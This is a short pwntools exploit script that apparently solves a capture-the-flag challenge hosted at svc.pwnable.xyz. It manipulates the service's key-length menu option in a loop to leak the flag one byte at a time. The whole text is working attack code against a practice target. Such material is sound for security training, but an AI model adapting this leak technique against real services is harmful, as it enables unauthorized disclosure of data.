from pwn import *

# p = process('./challenge')
p = remote('svc.pwnable.xyz',30006)
# gdb.attach(p)
# context.log_level = "debug"

p.sendlineafter('>', '3')
p.sendafter('?', 'y')
p.sendlineafter('Enter comment: ', 'AAAABBBB')
p.sendlineafter('>', '1')
p.sendlineafter('key len:', '64')

flag = 'F'

for i in range(0x41):
	p.sendlineafter('>', '1')
	p.sendlineafter('key len:', str(i+1))
	p.sendlineafter('>', '2')
	p.sendlineafter('>', '3')
	p.sendafter('?', 'n')
	data = p.recvuntil('1. Re-generate key')
	flag += data[i+2]
	print flag

